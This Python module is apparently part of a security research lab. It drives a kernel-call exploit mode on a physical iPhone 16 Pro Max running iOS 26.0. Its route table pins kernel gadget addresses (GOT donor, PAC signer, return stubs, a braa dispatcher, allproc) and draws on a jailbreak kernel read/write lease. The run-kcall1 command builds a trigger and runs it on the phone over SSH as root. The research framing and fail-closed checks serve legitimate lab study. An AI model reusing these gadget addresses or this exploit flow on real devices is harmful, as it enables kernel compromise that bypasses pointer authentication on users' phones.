#!/usr/bin/env python3
"""Physical-device port of the kcall1 (ifnet-kcall1-pac-canary) mode.

The kcall1 mode is KRW-constructed: the producer report pins
``ifnetKCall1ProviderKCallUsed: False`` and the shared validator refuses
any ``KernelCall`` provider operation, so kcall1 needs exactly an
independently validated kernel read/write lease plus reversible ifnet
GOT/X0 staging. On the physical device (iPhone 16 Pro Max, iPhone17,2,
iOS 26.0 23A341) that KRW lease is the one already acquired on the phone
through the lab provider's physical backends — jailbreak libkrw-tfp0
(``cnd_provide_tfp0.c`` dlopen paths) and the host special port 4 /
``task_for_pid(0)`` kernel-task acquisition. The VM syscall-439 backend
is never used, never inferred from, and never routed through this tool.

Everything here is fail-closed. The phone route table below is resolved
against the pinned phone kernelcache by real derivation (Ghidra
fingerprint matching self-checked against the pinned VM statics; the
record files are cited per entry under
docs/research/kcall1-phone-derivation-20261016/). The producer ``.m``
carries the matching phone constant block (``CNDStaticPhone*``,
cnd_iouserethernet_krw_trigger.m:2927-3037) and selects it from the
EXPECTED_BASE argument; this harness re-reads that block and refuses to
run unless every element agrees with the derivation and none is
``CNDUnresolvedStatic``. It never guesses an address ("Never scan or
brute-force speculative kernel addresses", `docs/research/vm-guide.md`
hard rules): an entry without a derivation citation, an unresolved role,
an unresolved layout element, or a producer constant that disagrees with
the derivation stops the flow before any device contact.

Evidence standard: implemented ≠ VM-proved ≠ physical-proved. Nothing this
tool does without a live phone run is physical evidence, and nothing the
VM produced becomes physical evidence by being re-validated here.

Scope: this module is the host-side verification half of the port — the
phone route and layout tables, the fail-closed gates and the report
validator, exercised by ``scripts/tests/test_physical_kcall1_krw.py``. Its
``verify``/``run-kcall1`` device commands are the earlier host-driven flow,
kept for reference and exercised only through their refusal gates. The
physical phone run does not use them: it runs entirely on the device —
``cnd_provide_tfp0`` (the phone's own KRW lease, ``auto``) plus
``cnd_iouserethernet_krw_trigger <socket> auto <bluetoothd pid>
--ifnet-kcall1-pac-canary``, whose own report and exit status are the
verdict. Build/copy/run recipe:
``docs/research/kcall1-phone-derivation-20261016/README.md``.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import re
import shlex
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from cnd_iouserethernet_krw_trigger import (
    DONOR_ENTITLEMENT,
    DONOR_EXECUTABLE,
    MODE_KCALL1,
    TRIGGER_SOURCE,
    donor_entitlement_is_present,
    exact_process_pid,
    validate_result,
)
from cnd_rea_secure_execution import write_json
from cnd_remotecall_lab import DEFAULT_KNOWN_HOSTS, LabError, SSH
from cnd_vphone_krw import STANDALONE_KRW_SOCKET_PATH, build_binary, copy_binary


REPO_ROOT = Path(__file__).resolve().parents[2]
PROVIDER_SOURCE = REPO_ROOT / "scripts/lab/cnd_provide_tfp0.c"

# The exact physical phone: iPhone 16 Pro Max, iOS 26.0 (23A341).
PHONE_MODEL = "iPhone17,2"
PHONE_OSVERSION = "23A341"

# The pinned phone kernel image, positively identified for this port:
# the decompressed iPhone17,2 23A341 kernelcache (UUID below), identical
# to the physical device's kernelcache, with a 39,825-entry symbol map.
PHONE_KERNEL_UUID = "76BB58BF-911D-07E4-D681-DCE7F2DDA3CE"
PHONE_KERNEL_IMAGE = REPO_ROOT / (
    "build/lab-cs-allow-invalid/kernel-23A341/"
    "kernelcache.release.iphone17.dec/kernelcache.release.iphone17.decompressed"
)
PHONE_SYMBOLS = REPO_ROOT / (
    "build/lab-cs-allow-invalid/kernel-23A341/symbols/"
    "kernelcache.release.iphone17.decompressed.symbols.json"
)
# The phone kernelcache is a fileset like the VM's, but laid out in its
# own static space: container __TEXT vmaddr 0xfffffff007004000 and the
# com.apple.kernel fileset entry at 0xfffffff00700c000
# (docs/research/kcall1-phone-derivation-20261016/
# phone-kernelcache-header.txt:6,10). The VM pins live in the vPhone's
# 0xfffffe00... space, so no VM static can transfer to the phone.
PHONE_KERNELCACHE_CONTAINER_BASE = 0xFFFFFFF007004000
PHONE_KERNEL_FILESET_ENTRY_BASE = 0xFFFFFFF00700C000
# The first entry of the pinned symbol map (mach_trap_table), used as the
# map's identity check.
PHONE_KERNEL_STATIC_BASE = 0xFFFFFFF007C38000
PHONE_SYMBOL_COUNT_MINIMUM = 39000
# The producer accepts a slide below 2^32 (.m CNDLayoutAccepts) and the
# kernelcache slides in 16 KiB pages.
PHONE_PAGE_SIZE = 0x4000
PHONE_SLIDE_LIMIT = 0x100000000

# The VM syscall-439 backend is a VM-only jailbreak-kernel facility
# (vm-guide hard rules); this tool never references it. KRW sources on
# the phone, quoted from the provider source:
PHYSICAL_KRW_SOURCES = (
    "cnd_provide_tfp0.c:326-335 libkrw-tfp0 jailbreak dlopen paths",
    "cnd_provide_tfp0.c:834-847 host special port 4 / task_for_pid(0) "
    "kernel-task acquisition",
)
PHYSICAL_KRW_ANCHORS = (
    ("/var/jb/usr/lib/libkrw/libkrw-tfp0.dylib", 326, 335),
    ("host_get_special_port", 834, 847),
)


@dataclass(frozen=True)
class RouteRole:
    """One kcall1 route element, with its VM-static contrast.

    `m_constant` names the producer constant, `m_value_line` is the
    1-based line in TRIGGER_SOURCE whose text must contain `m_anchor`,
    and `vm_static` is the vPhone 23A341 static value pinned there.
    """

    role: str
    m_constant: str
    m_value_line: int
    m_anchor: str
    vm_static: int


@dataclass(frozen=True)
class PhoneRouteEntry:
    """The phone-side address for one route role, or an explicit gap.

    `address` None means unresolved on the pinned phone image; the
    citation then names the pending owner/RE request. An entry may be
    resolved only with a real derivation citation; never a guess.
    """

    address: int | None
    citation: str


# The seven kcall1 route elements, in the order the producer defines
# them (cnd_iouserethernet_krw_trigger.m:97-115). All are VM (vPhone
# 23A341 fileset) statics; the phone-side values live in PHONE_ROUTE and
# in the producer's CNDStaticPhone* block.
ROUTE_ROLES: tuple[RouteRole, ...] = (
    RouteRole("checkmulti_got_donor", "CNDStaticIOEthernetCheckMultiGOT",
              98, "UINT64_C(0xfffffe000799f588)", 0xFFFFFE000799F588),
    RouteRole("stock_callback", "CNDStaticEtherCheckMulti",
              100, "UINT64_C(0xfffffe0007d293fc)", 0xFFFFFE0007D293FC),
    RouteRole("init_ifnet_params", "CNDStaticIOEthernetInitIfnetParams",
              102, "UINT64_C(0xfffffe0008f87a38)", 0xFFFFFE0008F87A38),
    RouteRole("stock_signer", "CNDStaticIOEthernetCheckMultiSigner",
              104, "UINT64_C(0xfffffe0008f87bf0)", 0xFFFFFE0008F87BF0),
    RouteRole("enoexec_return_stub", "CNDStaticENOEXECReturn",
              107, "UINT64_C(0xfffffe00082f6a38)", 0xFFFFFE00082F6A38),
    RouteRole("load_w0_from_x0_stub", "CNDStaticLoadW0FromX0",
              110, "UINT64_C(0xfffffe00082f6590)", 0xFFFFFE00082F6590),
    RouteRole("ifnet_x0_dispatcher", "CNDStaticIfnetX0Dispatcher",
              115, "UINT64_C(0xfffffe0008f94a8c)", 0xFFFFFE0008F94A8C),
)

RE_PENDING = (
    "unresolved on the pinned iPhone17,2 23A341 kernelcache "
    "(UUID {PHONE_KERNEL_UUID}); derivation is an owner/RE request"
).format(PHONE_KERNEL_UUID=PHONE_KERNEL_UUID)

# Derivation record directory (checked in; the build/ working copies are
# gitignored). Every resolved entry below cites file:line witnesses in
# it. Producers: scripts/ghidra/CndKcall1PhoneKernelFind.java (phone
# kernel, self-checked on the research kernel: selfcheck-research.txt),
# scripts/ghidra/CndKcall1PhoneKextFind.java (phone IONetworkingFamily,
# self-checked on the VM kext: selfcheck-kext.txt), and
# scripts/ghidra/CndKcall1ProcIterateScan.java +
# CndKcall1AllProcFind.java (allproc; self-checked on the research
# kernel inside phone-allproc-find.txt).
DERIVATION_DIR = REPO_ROOT / "docs/research/kcall1-phone-derivation-20261016"
DERIVATION_LEVEL = (
    "Level: implemented (static derivation against the pinned image; no "
    "phone run has happened)."
)

# Phone route table. A role is resolved only by a real derivation
# against PHONE_KERNEL_IMAGE (the Ghidra projects were built from it),
# recorded with its citation here; a role whose derivation is ambiguous,
# empty or structurally different stays an explicit RE_PENDING gap.
PHONE_ROUTE: dict[str, PhoneRouteEntry] = {
    "checkmulti_got_donor": PhoneRouteEntry(
        0xFFFFFFF0080B4020,
        "phone-kext-find.txt:152 GOT-SLOT fffffff0080b4020 block __got "
        "raw8 0x1000000148c44c symbol PTR_DAT_fffffff0080b4020; :151 "
        "GOT-READ at init_ifnet_params+0x1b0 (vm-offset-match true); "
        ":153-156 the slot's only reference is that READ (REF-COUNT 1, "
        "GOT-SLOT-COUNT 1). VM self-check selfcheck-kext.txt:134 "
        "rediscovers fffffe000799f588 raw8 0x10000000d253fc the same way."),
    "stock_callback": PhoneRouteEntry(
        0xFFFFFFF00849044C,
        "phone-kernel-find.txt:23-52 STOCK-EXACT-BTI fffffff00849044c "
        "size 84: the unique function (STOCK-EXACT-BTI-COUNT 1, "
        "STOCK-EXACT-COUNT 0, STOCK-MNEMONIC-COUNT 0) whose body after a "
        "single `bti c` landing pad equals the 20-instruction VM "
        "fingerprint (stock-fingerprint.txt) instruction for instruction, "
        "with 4 DATA references (:45-49) as on the VM "
        "(selfcheck-research.txt:44-48). Independently: the __got donor "
        "raw chained-fixup value 0x1000000148c44c (phone-kext-find.txt:152) "
        "has target offset 0x148c44c; container base 0xfffffff007004000 "
        "(phone-kernelcache-header.txt:6) + 0x148c44c = fffffff00849044c, "
        "and the dump at that address agrees "
        "(phone-kernel-find.txt:71-73,136-137,142: "
        "GOT-CANDIDATE-AFTER-BTI-EXACT true, 4 refs). The same arithmetic "
        "reproduces the VM pin (0xfffffe0007004000 + 0xd253fc = "
        "fffffe0007d293fc; selfcheck-research.txt:70-73,113-114)."),
    "init_ifnet_params": PhoneRouteEntry(
        0xFFFFFFF00A6DA548,
        "phone-kext-find.txt:4 INIT-MNEMONIC fffffff00a6da548 size 492: "
        "the unique 123-instruction mnemonic match (INIT-MNEMONIC-COUNT 1, "
        "INIT-EXACT-COUNT 0; :158-159); all 18 DIFF lines (:5-23) are adrp "
        "page values and page-offset immediates (relocation-only); every "
        "PAC discriminator (0xe2f, 0xcda1, 0x93b7, 0x37a5, 0xbb9b, 0xd240, "
        "0x61de, 0x629a, 0x50c7, 0xe28a, 0xe4fe), the brk 0xc472 traps and "
        "the [x19+0x30/0x38/0x40/0x50/0x48/0x80] stores are identical; one "
        "DATA reference (:147-149) as on the VM (selfcheck-kext.txt:4-8 "
        "INIT-EXACT fffffe0008f87a38)."),
    "stock_signer": PhoneRouteEntry(
        0xFFFFFFF00A6DA700,
        "phone-kext-find.txt:150 SIGNER fffffff00a6da700 offset 0x1b8 "
        "vm-offset-match true: the `pacia x16,x17` preceded by "
        "`mov x17,#0xe4fe` and followed by `str x16,[x19,#0x48]` inside "
        "the matched init_ifnet_params (SIGNER-PATTERN-COUNT 1, :157); the "
        "VM relation stock_signer = init_ifnet_params + 0x1b8 "
        "(.m:102-104) holds on the phone."),
    "enoexec_return_stub": PhoneRouteEntry(
        0xFFFFFFF008A4B5D8,
        "phone-kernel-find.txt:62-69 OUTLINE-RUN fffffff008a4b590 (13 "
        "elements) whose value sequence contains the VM array structure "
        "8,1,2,4,8,4,8 exactly once in the whole kernel "
        "(ENOEXEC-SEQUENCE-COUNT 1); element 6 at fffffff008a4b5d8 is "
        "`bti c; mov w0,#0x8; ret` with no references, as on the VM "
        "(selfcheck-research.txt:61-68, element 6 of the identical "
        "13-element run at fffffe00082f69f0)."),
    "load_w0_from_x0_stub": PhoneRouteEntry(
        0xFFFFFFF008A4B130,
        "phone-kernel-find.txt:54-61 OUTLINE-RUN fffffff008a4b118 (6 "
        "elements) whose value sequence contains ldr:,ldr:0x4,ldr:0x8,"
        "str:0x8 exactly once in the whole kernel (LOAD-SEQUENCE-COUNT 1, "
        ":70); element 2 at fffffff008a4b130 is `bti c; ldr w0,[x0]; ret` "
        "with two UNCONDITIONAL_CALL references, as on the VM "
        "(selfcheck-research.txt:53-59, element 2 of the identical "
        "6-element run at fffffe00082f6578)."),
    "ifnet_x0_dispatcher": PhoneRouteEntry(
        0xFFFFFFF00A6E759C,
        "phone-kext-find.txt:160-172 DISPATCHER-EXACT fffffff00a6e759c "
        "size 28: the unique exact match (DISPATCHER-EXACT-COUNT 1) of "
        "`bti c; ldr x16,[x0,#0xb0]; cbz x16; ldr x0,[x0,#0x90]; "
        "mov x17,#0xe4fe; braa x16,x17; ret`, with the [x0,#0xb8] neighbor "
        "at +28 (:168) and one DATA reference (:170), as on the VM "
        "(selfcheck-kext.txt DISPATCHER-EXACT fffffe0008f94a8c)."),
}

# The producer's phone layout block (.m:2927-3037) carries the seven
# route roles plus four non-route statics. Every element is named here
# by its CNDStaticPhone* suffix, so the harness can re-read the block
# and compare it with the derivation instead of trusting it.
PHONE_LAYOUT_ROUTE_CONSTANTS: dict[str, str] = {
    "checkmulti_got_donor": "IOEthernetCheckMultiGOT",
    "stock_callback": "EtherCheckMulti",
    "init_ifnet_params": "IOEthernetInitIfnetParams",
    "stock_signer": "IOEthernetCheckMultiSigner",
    "enoexec_return_stub": "ENOEXECReturn",
    "load_w0_from_x0_stub": "LoadW0FromX0",
    "ifnet_x0_dispatcher": "IfnetX0Dispatcher",
}
# Non-route layout statics, each with its own derivation citation. The
# VM contrasts: CNDStaticKernelBase (.m:24-25), CNDStaticAllProc (.m:26-27),
# CNDZoneMin/CNDZoneMax (.m:116-117).
PHONE_LAYOUT_STATICS: dict[str, PhoneRouteEntry] = {
    "KernelBase": PhoneRouteEntry(
        PHONE_KERNELCACHE_CONTAINER_BASE,
        "phone-kernelcache-header.txt:6 CONTAINER-TEXT vmaddr "
        "0xfffffff007004000 (otool -l on the pinned kernelcache); the "
        "producer rebases every phone static on this container base as "
        "it rebases the VM statics on 0xfffffe0007004000 (.m:25)."),
    "AllProc": PhoneRouteEntry(
        0xFFFFFFF00B2FAA18,
        "phone-allproc-find.txt:125-127 the unique proc_iterate-shaped "
        "function (MATCH-COUNT 1 of 21490 scanned) at fffffff008726f6c, "
        "which the pinned symbol map names _proc_iterate (:128), loads "
        "its bit-0 (PROC_ALLPROCLIST) guarded 64-bit list head from "
        "fffffff00b2faa18 and its bit-1 (PROC_ZOMBPROCLIST) head from "
        "fffffff00b2faa20 = +8 (:213-217, ALLPROC-CANDIDATE-COUNT 1); "
        "15 references from 8 functions including _pinsertchild, "
        "_proc_shutdown, _bsd_init and getpriority (:233-253). VM "
        "self-check: the same scan on the research kernel matches "
        "exactly one function and its bit-0 head equals the vPhone pin "
        "CNDStaticAllProc 0xfffffe0009813020 (.m:26-27; :10-13 SELF-CHECK match "
        "true; :89-94), also with 15 references from 8 functions "
        "(:110-118)."),
    "ZoneMin": PhoneRouteEntry(
        0xFFFFFFDC00000000,
        "cnd_physical_cs_allow_invalid_probe.m:39 CND_KERNEL_OBJECT_MIN, "
        "the kernel-object window the repo's physical probe pins for "
        "this phone."),
    "ZoneMax": PhoneRouteEntry(
        0xFFFFFFFBFFFFFFFF,
        "cnd_physical_cs_allow_invalid_probe.m:40 CND_KERNEL_OBJECT_MAX, "
        "the kernel-object window the repo's physical probe pins for "
        "this phone."),
}
PHONE_LAYOUT_NAME = "iphone17,2-23A341"
PHONE_LAYOUT_CONSTANT = re.compile(
    r"static const uint64_t CNDStaticPhone(\w+) =\s*"
    r"(CNDUnresolvedStatic|UINT64_C\(0x([0-9A-Fa-f]{16})\));"
)
PHONE_LAYOUT_UNRESOLVED_MARKER = \
    "static const uint64_t CNDUnresolvedStatic = UINT64_C(0);"

NEVER_SCAN_RULE = (
    '"Never scan or brute-force speculative kernel addresses." '
    "(docs/research/vm-guide.md hard rules)"
)

# Evidence vocabulary, mirroring cnd_iouserethernet_krw_trigger's
# LEVEL_* strings; a port scaffold is implemented only, and only a live
# phone run can ever produce physical evidence.
LEVEL_PHYSICAL_IMPLEMENTED = (
    "Level: implemented (phone port scaffold; nothing has run on the "
    "physical device; no physical evidence exists yet)."
)
LEVEL_PHYSICAL_PROVED = (
    "Level: physical-proved for exactly the validated kcall1 report from "
    "a live iPhone17,2 23A341 run, and nothing wider; VM results stay "
    "VM-proved and are never broadened by this tool."
)
KCALL1_PHYSICAL_CONCLUSION = (
    "The kcall1 (ifnet-kcall1-pac-canary) mode ported to the phone's own "
    "KRW lease (libkrw-tfp0 backends; never the VM syscall-439 backend). "
    "A phone run is validated with the same shared validator as the VM "
    f"mode; anything less than a live run is {LEVEL_PHYSICAL_IMPLEMENTED}"
)
OBSERVATION_SCHEMA = \
    "com.zeroxjf.cyanide.iouserethernet-krw-physical-observation"

# Owner-request list (flagged, not edited here).
OWNER_REQUESTS: tuple[tuple[str, str], ...] = (
    ("cnd_iouserethernet_krw_trigger.m (landed, implemented-level)",
     "the phone constant block CNDStaticPhone* (.m:2927-3037) pins the "
     "iPhone17,2 23A341 kernelcache layout next to the untouched vPhone "
     "constants (.m:97-115); CNDSelectLayoutForBase picks it from "
     "EXPECTED_BASE and CNDLayoutAccepts refuses any non-kcall1 mode on "
     "it. This harness re-reads the block and refuses on disagreement."),
    ("RE derivation (landed, implemented-level)",
     "the seven route roles and allproc are derived against the pinned "
     f"phone kernelcache ({PHONE_KERNEL_IMAGE.name}, UUID "
     f"{PHONE_KERNEL_UUID}) by Ghidra matching self-checked on the VM "
     f"pins; see PHONE_ROUTE / PHONE_LAYOUT_STATICS citations and "
     f"{DERIVATION_DIR.name}/. {DERIVATION_LEVEL}"),
    ("live phone run (owner step; not performed by this tool's authors)",
     "run `run-kcall1 --kernel-address <slid phone kernelcache base>` "
     "against the phone with its standalone KRW provider up; the report "
     "is physical-proved only if it passes the shared validator"),
    ("evidence discipline",
     "a resolved route plus a producer phone build still yields nothing "
     "physical until the harness runs on the phone and the report passes "
     "the shared validator"),
)


def require_physical_device(ssh: SSH) -> None:
    """Refuse anything but the exact physical phone (and never the VM)."""
    command = (
        "PATH=/iosbinpack64/bin:/iosbinpack64/usr/bin:"
        "/iosbinpack64/usr/sbin:/bin:/usr/bin:/usr/sbin:/sbin; "
        "sysctl -n hw.model; uname -a"
    )
    lines = [line.strip() for line in ssh.command(command).splitlines()
             if line.strip()]
    if len(lines) < 2:
        raise LabError(
            "refusing: the SSH target did not report a model and kernel"
        )
    model = lines[0]
    if model == "VPHONE" or "VRESEARCH" in lines[1]:
        raise LabError(
            "refusing: the SSH target identified as a vPhone VRESEARCH "
            "guest; this tool is physical-device only"
        )
    if model != PHONE_MODEL or PHONE_OSVERSION not in lines[1]:
        raise LabError(
            f"refusing: expected the pinned phone ({PHONE_MODEL} "
            f"{PHONE_OSVERSION}), observed {model} {lines[1]}"
        )


def verify_phone_image() -> dict[str, Any]:
    """Fail closed unless the pinned phone kernel artifacts are intact."""
    for path in (PHONE_KERNEL_IMAGE, PHONE_SYMBOLS):
        if not path.is_file():
            raise LabError(f"pinned phone kernel artifact missing: {path}")
    symbols = json.loads(PHONE_SYMBOLS.read_text())
    if len(symbols) < PHONE_SYMBOL_COUNT_MINIMUM:
        raise LabError("pinned phone symbol map is truncated")
    base_key = str(PHONE_KERNEL_STATIC_BASE)
    if symbols.get(base_key) != "mach_trap_table":
        raise LabError(
            "pinned phone symbol map does not start at the expected "
            "static base"
        )
    if not any("vtable for IOUserEthernetInterface" == name
               for name in symbols.values()):
        raise LabError("pinned phone symbol map lacks the IOUserEthernet "
                       "kext symbols")
    return {"symbolCount": len(symbols),
            "staticBase": f"0x{PHONE_KERNEL_STATIC_BASE:016x}"}


def unresolved_roles() -> list[str]:
    return [role for role, entry in PHONE_ROUTE.items()
            if entry.address is None]


def require_phone_route() -> None:
    """Refuse to run while any route role is an unresolved gap."""
    for role, entry in PHONE_ROUTE.items():
        if entry.address is not None and not entry.citation.strip():
            raise LabError(
                f"refusing: route role {role} is resolved without a "
                "derivation citation; a resolved entry must cite its "
                "real derivation against the pinned phone image"
            )
    pending = unresolved_roles()
    if pending:
        raise LabError(
            "refusing: the phone route table is unresolved for: "
            + ", ".join(pending)
            + f". No address is guessed. {NEVER_SCAN_RULE} "
            f"Phone-side derivation is an owner/RE request; see "
            "OWNER_REQUESTS in this file."
        )


def phone_layout_constants() -> dict[str, int | None]:
    """Re-read the producer's CNDStaticPhone* block, element by element.

    Returns {suffix: value}, with None for an element the producer
    leaves as CNDUnresolvedStatic. The block's unresolved marker must
    exist as pinned, or the parse is not trusted.
    """
    source = TRIGGER_SOURCE.read_text()
    if PHONE_LAYOUT_UNRESOLVED_MARKER not in source:
        raise LabError(
            "producer source drifted: the CNDUnresolvedStatic marker "
            "(.m:2946) is missing, so the phone layout cannot be reflected"
        )
    constants: dict[str, int | None] = {}
    for match in PHONE_LAYOUT_CONSTANT.finditer(source):
        suffix, _, value = match.groups()
        constants[suffix] = None if value is None else int(value, 16)
    if not constants:
        raise LabError(
            "refusing: the producer .m pins only the vPhone 23A341 "
            "layout (.m:97-115) and has no phone constant block "
            "(CNDStaticPhone*); running it on the phone would target "
            "the wrong image."
        )
    return constants


def phone_layout_unresolved() -> list[str]:
    """Elements the producer's phone layout still refuses as unresolved."""
    constants = phone_layout_constants()
    expected = set(PHONE_LAYOUT_ROUTE_CONSTANTS.values()) | \
        set(PHONE_LAYOUT_STATICS)
    missing = sorted(expected - set(constants))
    return sorted(suffix for suffix, value in constants.items()
                  if value is None) + missing


def require_producer_physical_support() -> None:
    """Refuse unless the producer .m reflects this port's derivation.

    The producer keeps its vPhone constants (cnd_iouserethernet_krw_trigger.m:
    97-115) byte-identical and carries a separate CNDStaticPhone* block
    (.m:2927-3037) that CNDSelectLayoutForBase picks when EXPECTED_BASE
    lies in the phone's static space. This gate pins the vPhone anchors,
    requires the phone block, and requires every resolved phone constant
    to equal the harness's derived value (PHONE_ROUTE and
    PHONE_LAYOUT_STATICS), so the harness and producer cannot disagree
    silently. Unresolved elements are reported by phone_layout_unresolved
    and refused separately by require_phone_layout_complete.
    """
    lines = TRIGGER_SOURCE.read_text().splitlines()
    for role in ROUTE_ROLES:
        text = lines[role.m_value_line - 1]
        if role.m_anchor not in text:
            raise LabError(
                "producer source drifted: expected "
                f"{role.m_constant} anchor {role.m_anchor} at .m:"
                f"{role.m_value_line}"
            )
    constants = phone_layout_constants()
    expected: dict[str, int | None] = {
        suffix: entry.address
        for suffix, entry in PHONE_LAYOUT_STATICS.items()}
    for role, suffix in PHONE_LAYOUT_ROUTE_CONSTANTS.items():
        expected[suffix] = PHONE_ROUTE[role].address
    for suffix, derived in expected.items():
        if suffix not in constants:
            raise LabError(
                f"producer source drifted: the phone layout has no "
                f"CNDStaticPhone{suffix} constant"
            )
        actual = constants[suffix]
        if actual is None or derived is None:
            continue
        if actual != derived:
            raise LabError(
                f"refusing: producer CNDStaticPhone{suffix} = "
                f"0x{actual:016x} disagrees with the derivation "
                f"0x{derived:016x}; the harness and producer must cite "
                "the same derived value"
            )


def require_phone_layout_complete() -> None:
    """Refuse while the producer's phone layout has an unresolved element.

    The producer itself refuses such a layout ("kernel-layout-incomplete")
    before any layout-derived read; this gate makes the harness agree
    before it builds, stages or contacts anything.
    """
    unresolved = phone_layout_unresolved()
    if unresolved:
        raise LabError(
            "refusing: the producer phone layout is unresolved for: "
            + ", ".join(unresolved)
            + f". No address is guessed. {NEVER_SCAN_RULE} "
            "Derivation (self-checked against the vPhone pin) is an "
            "owner/RE request; see OWNER_REQUESTS in this file."
        )


def require_physical_krw_sources() -> None:
    """The provider's physical KRW backends must still exist as cited."""
    lines = PROVIDER_SOURCE.read_text().splitlines()
    for anchor, start, end in PHYSICAL_KRW_ANCHORS:
        window = "".join(lines[start - 1:end])
        if anchor not in window:
            raise LabError(
                "provider physical KRW source drifted: expected "
                f"{anchor!r} within cnd_provide_tfp0.c:{start}-{end}"
            )


def require_phone_kernel_address(value: str | None) -> str:
    """The slid phone kernelcache base the producer must observe.

    The producer passes EXPECTED_BASE to CNDSelectLayoutForBase (phone
    layout iff it lies at or above the container base) and refuses
    unless the provider's KBase equals it (.m matchingBootLayout) and a
    MH_FILESET header sits there. The owner reads it from the phone's
    own KRW provider (observedKernelBase); this harness only checks it
    is phone-shaped and page-slid, never derives or guesses it.
    """
    if value is None:
        raise LabError(
            "supply --kernel-address: the slid phone kernelcache base "
            "reported by the phone's KRW provider"
        )
    if not re.fullmatch(r"0x[0-9A-Fa-f]{16}", value):
        raise LabError("kernel address must be 16-digit hexadecimal")
    address = int(value, 16)
    if address < PHONE_KERNELCACHE_CONTAINER_BASE:
        raise LabError(
            f"refusing: kernel address {value} lies below the phone "
            f"container base 0x{PHONE_KERNELCACHE_CONTAINER_BASE:016x}; "
            "the producer would select the vPhone layout (a VM address "
            "is never a phone address)"
        )
    slide = address - PHONE_KERNELCACHE_CONTAINER_BASE
    if slide % PHONE_PAGE_SIZE or slide >= PHONE_SLIDE_LIMIT:
        raise LabError(
            f"refusing: kernel address {value} is not a page-aligned "
            "slide below 2^32 of the phone container base"
        )
    return value.lower()


def validate_phone_kcall1_report(value: Any) -> dict[str, Any]:
    """Validate a phone kcall1 report with the shared VM-mode validator.

    Reusing validate_result keeps the phone port honest: the same
    required keys, pinned values, bound pairs and no-KernelCall rule
    apply, and the VM results never broaden by being validated here.
    On top, the report must say the producer ran the phone layout.
    """
    result = validate_result(value, require_ifnet_kcall1_pac_canary=True)
    if result.get("kernelLayout") != PHONE_LAYOUT_NAME:
        raise LabError(
            "phone kcall1 report did not run on the phone layout: "
            f"kernelLayout {result.get('kernelLayout')!r}"
        )
    if "kernelLayoutUnresolved" in result:
        raise LabError(
            "phone kcall1 report carries an unresolved layout element: "
            f"{result['kernelLayoutUnresolved']!r}"
        )
    return result


def run_kcall1(args: argparse.Namespace) -> dict[str, Any]:
    """Phone kcall1 flow: every gate, then build, stage, run, validate.

    Order: local gates (image, route, producer agreement, layout
    completeness, KRW sources, kernel address) -> local build -> device
    identity -> KRW socket -> donor -> stage -> execute through the
    phone's standalone KRW lease -> shared validation. Any gate failing
    stops before the next step; nothing contacts the device until the
    build exists and every local gate has passed.
    """
    verify_phone_image()
    require_phone_route()           # route gaps stop everything first
    require_producer_physical_support()
    require_phone_layout_complete()
    require_physical_krw_sources()
    kernel_address = require_phone_kernel_address(args.kernel_address)
    trigger = build_binary(
        TRIGGER_SOURCE, "cnd_iouserethernet_krw_trigger",
        architecture="arm64e", frameworks=("Foundation", "IOKit"),
    )
    digest = hashlib.sha256(trigger.read_bytes()).hexdigest()
    ssh = SSH(args.host, args.port, args.user, args.known_hosts,
              args.password_env)
    require_physical_device(ssh)
    if ssh.file_kind(STANDALONE_KRW_SOCKET_PATH) != "socket":
        raise LabError("phone KRW provider is not running")
    if not donor_entitlement_is_present(ssh):
        raise LabError(f"{DONOR_EXECUTABLE} lacks {DONOR_ENTITLEMENT}")
    donor_pid = exact_process_pid(
        ssh.command("/bin/ps -axo pid=,command="), DONOR_EXECUTABLE
    )
    remote = copy_binary(ssh, trigger, "cnd-iouserethernet-krw-phone")
    command = (
        f"{shlex.quote(remote)} "
        f"{shlex.quote(STANDALONE_KRW_SOCKET_PATH)} "
        f"{shlex.quote(kernel_address)} {donor_pid} "
        "--ifnet-kcall1-pac-canary"
    )
    hold = getattr(args, "hold", 0) or 0
    if hold:
        command += f" --hold {hold}"
    output = ssh.command(command)
    try:
        report = json.loads(output)
    except json.JSONDecodeError as error:
        raise LabError(
            "phone kcall1 trigger did not return JSON") from error
    result = validate_phone_kcall1_report(report)
    return {
        "schema": OBSERVATION_SCHEMA,
        "schemaVersion": 1,
        "classification": "physical-runtime-observed",
        "device": f"{PHONE_MODEL} {PHONE_OSVERSION}",
        "kernelUUID": PHONE_KERNEL_UUID,
        "kernelAddress": kernel_address,
        "kernelBase": result["observedKernelBase"],
        "kernelLayout": result["kernelLayout"],
        "krwSocket": STANDALONE_KRW_SOCKET_PATH,
        "krwSources": list(PHYSICAL_KRW_SOURCES),
        "mode": MODE_KCALL1,
        "triggerSHA256": digest,
        "result": result,
        "level": LEVEL_PHYSICAL_PROVED,
        "conclusion": KCALL1_PHYSICAL_CONCLUSION,
    }


def verify(args: argparse.Namespace) -> dict[str, Any]:
    """Gate + image + route + layout + producer + KRW-source status."""
    verify_phone_image()
    require_physical_krw_sources()
    ssh = SSH(args.host, args.port, args.user, args.known_hosts,
              args.password_env)
    require_physical_device(ssh)
    status: dict[str, Any] = {
        "device": f"{PHONE_MODEL} {PHONE_OSVERSION}",
        "kernelUUID": PHONE_KERNEL_UUID,
        "mode": MODE_KCALL1,
        "routeUnresolved": unresolved_roles(),
        "phoneLayout": PHONE_LAYOUT_NAME,
        "producerPhysicalSupport": False,
    }
    try:
        require_producer_physical_support()
    except LabError as error:
        status["producerPhysicalSupportRefusal"] = str(error)
    else:
        status["producerPhysicalSupport"] = True
    try:
        status["phoneLayoutUnresolved"] = phone_layout_unresolved()
    except LabError as error:
        status["phoneLayoutUnresolved"] = [f"unreadable: {error}"]
    status["krwSocket"] = ssh.file_kind(STANDALONE_KRW_SOCKET_PATH)
    status["level"] = LEVEL_PHYSICAL_IMPLEMENTED
    status["conclusion"] = KCALL1_PHYSICAL_CONCLUSION
    return status


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, default=22)
    parser.add_argument("--user", default="root")
    parser.add_argument("--known-hosts", type=Path,
                        default=DEFAULT_KNOWN_HOSTS)
    parser.add_argument("--password-env", default="CND_PHONE_ROOT_PASSWORD")
    commands = parser.add_subparsers(dest="command", required=True)
    commands.add_parser(
        "verify", help="gate + image + route + layout + provider status "
                       "(no run)")
    run = commands.add_parser(
        "run-kcall1", help="fail-closed phone kcall1 flow")
    run.add_argument(
        "--kernel-address", required=True,
        help="slid phone kernelcache base reported by the phone's KRW "
             "provider (observedKernelBase), 0x-prefixed 16 hex digits")
